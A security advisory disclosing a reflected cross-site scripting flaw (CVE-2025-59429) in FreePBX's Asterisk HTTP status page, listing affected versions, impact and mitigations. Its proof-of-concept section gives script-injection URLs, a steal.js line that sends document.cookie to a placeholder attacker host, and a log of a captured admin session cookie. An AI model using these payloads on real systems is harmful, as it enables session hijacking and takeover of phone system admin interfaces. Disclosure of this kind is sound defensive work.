# FreePBX: Reflected Cross-site Scripting in Asterisk HTTP Status page

- **Advisory ID:** MCSAID-2025-005
- **CVE ID:** CVE-2025-59429
- **Product:** FreePBX (https://www.freepbx.org)
- **Reported:** 2025-09-04
- **Published:** 2025-10-20
- **Severity:** High
- **CWE:** [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
- **Discovered by:** Ivan Racic of Marlink Cyber

---

## Summary

The Asterisk HTTP status page is exposed by FreePBX and is available by default on v16 via any bound IP address at port 8088. By default on v17, the HTTP binding is only to localhost IP, so somewhat less vulnerable. The vulnerability can be exploited by unauthenticated attackers to obtain cookies from logged-in users, allowing to hijack a session of an administrative user.

---

## Affected Versions

| Version                                       | Status                    |
| --------------------------------------------- | ------------------------- |
| < 16.0.68.39                                  | Vulnerable                |
| < 17.0.18.38                                  | Vulnerable                |
|   16.0.68.39                                  | Patched                   |
|   17.0.18.38                                  | Patched                   |

---


## Proof of Concept

A PoC is easy to reproduce with the following simple payloads:

`http://[FreePBXIP]:8088/httpstatus?<script>alert(1)</script>`
`http://[FreePBXIP]:8088/httpstatus?<script>alert(document.cookie)</script>`

Using a cookie-stealing payload, it is possible to obtain session cookies from logged-in users:
`http://[FreePBXIP]:8088/httpstatus/?steal=<script%20src="http://[AttackerIP]/steal.js"></script>`

Steal.js contains:
`fetch("http://[AttackerIP]/"+document.cookie)`

Once the victim clicks on the cookie-stealing payload, it is possible to obtain the session cookie:

```
╭─user@machine /tmp/tmp
╰─➤  sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
XXX.XXX.XXX.XXX - - [04/Sep/2025 10:50:12] "GET /steal.js HTTP/1.1" 304 -
XXX.XXX.XXX.XXX - - [04/Sep/2025 10:50:12] "GET /steal.js HTTP/1.1" 304 -
XXX.XXX.XXX.XXX - - [04/Sep/2025 10:50:12] code 404, message File not found
XXX.XXX.XXX.XXX - - [04/Sep/2025 10:50:12] "GET /_ga_Z5YXFPYHZ8=GS2.1.s1756972362$o12$g1$t1756972538$j50$l0$h0;%20PHPSESSID=vs396ikdan2kr5otiqloeng791;%20_ga=GA1.1.951331459.1756457036;%20_ga_65BVXK7F61=GS2.1.s1756533719$o5$g1$t1756533849$j60$l0$h0;%20lang=en_US HTTP/1.1" 404 -

```

By reusing the obtained cookie it is possible to hijack the admin session and access the FreePBX admin interface at: https://[FreePBXIP]/admin/config.php

---

## Impact

The theft of admin session cookies allows attackers to gain control over the FreePBX admin interface, enabling them to access sensitive data, modify system configurations, create backdoor accounts, and cause service disruption.

---

## Fix / Mitigation

Besides updating the core module on supported versions of FreePBX, there are at least three additional ways to mitigate the impact of this issue and others of this class. These ideas should help users of all versions of FreePBX.
* Lock down HTTP status page to localhost
* Always logout when you are done
* Prevent hostile access

---

## References

* FreePBX Security Advisory: https://github.com/FreePBX/security-reporting/security/advisories/GHSA-c8g7-475j-fwcc